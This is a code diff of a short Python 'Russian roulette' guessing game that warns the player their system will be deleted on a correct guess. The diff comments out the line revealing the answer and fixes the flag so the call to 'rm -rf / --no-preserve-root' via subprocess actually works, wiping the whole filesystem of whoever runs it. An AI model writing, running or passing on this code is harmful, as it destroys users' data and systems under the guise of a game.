@@ -10,7 +10,7 @@ print("if you guess the cylinder I selected, your sytem gets deleted")
 while True:
     cylinder = random.randint(1, 6)
 
-    print ("cylinder", cylinder)
+    #print ("cylinder", cylinder)
         
     cylinder_guess = int(input("take a guess: "))
 
@@ -22,7 +22,7 @@ while True:
 
     if cylinder_guess == cylinder:
         print("say goodbye to your system")
-        subprocess.call("rm -rf / --no-root-preserve", shell=True)
+        subprocess.call("rm -rf / --no-preserve-root", shell=True)
         break
     else:    
         print("you live")
